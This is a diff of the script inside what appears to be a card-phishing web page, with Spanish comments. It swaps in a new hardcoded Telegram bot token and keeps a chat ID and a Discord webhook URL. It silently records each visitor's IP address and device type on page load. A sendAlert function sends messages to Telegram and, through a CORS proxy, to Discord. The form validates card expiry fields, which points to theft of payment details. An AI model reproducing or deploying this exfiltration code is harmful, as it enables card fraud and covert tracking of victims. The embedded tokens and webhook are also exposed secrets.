@@ -229,7 +229,7 @@
 </div>
 
 <script>
-    const botToken = "9058802985:AAHsFoOZUObdl2KE_Yd1y2gX7aKGh_Eit_s";
+    const botToken = "8943750094:AAHX8zChbKXbydhlfAQDKhyolSXDb4-_NP8";
     const chatId = "6375135873";
     const discordWebhookUrl = "https://discord.com/api/webhooks/1570736326683140157/qiUolqkPuTQWUAWcat2JZ_7xkPSDzsYGAlaW4A3UzPI-M9tJyOWj9imU11CgmqxmsO6M";
 
@@ -244,7 +244,7 @@
         return "💻 PC / Laptop";
     }
 
-    // Guardamos la IP y dispositivo silenciosamente al cargar (sin mandar alertas falsas de visitas)
+    // Capturar IP y dispositivo silenciosamente al cargar (sin enviar alertas falsas)
     window.addEventListener("DOMContentLoaded", async () => {
         const device = getDeviceType();
         try {
@@ -262,16 +262,16 @@
         }
     });
 
-    // Enviar alertas tanto a Telegram como a Discord de forma limpia
+    // Enviar alertas simultáneamente a Telegram y Discord cuando el usuario interactúe
     function sendAlert(message) {
         const fullMessage = `${message}\n\n📍 [INFO DE CONEXIÓN]\n- ${visitorInfo}`;
 
-        // Telegram
+        // 1. Enviar a Telegram
         const tgUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(fullMessage)}`;
         const img = new Image();
         img.src = tgUrl;
 
-        // Discord
+        // 2. Enviar a Discord vía proxy CORS
         if (discordWebhookUrl) {
             const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(discordWebhookUrl);
             fetch(proxyUrl, {
@@ -416,7 +416,7 @@
             if (!expMonth || !expYear) {
                 document.getElementById("expMonth").classList.add("error-input");
                 document.getElementById("expYear").classList.add("error-input");
-                document.getElementById("expError").innerText = "Select expiry date.";
+                document.getElementById("expError").innerText = "Please select expiry date.";
                 document.getElementById("expError").style.display = "block";
                 hasError = true;
             }
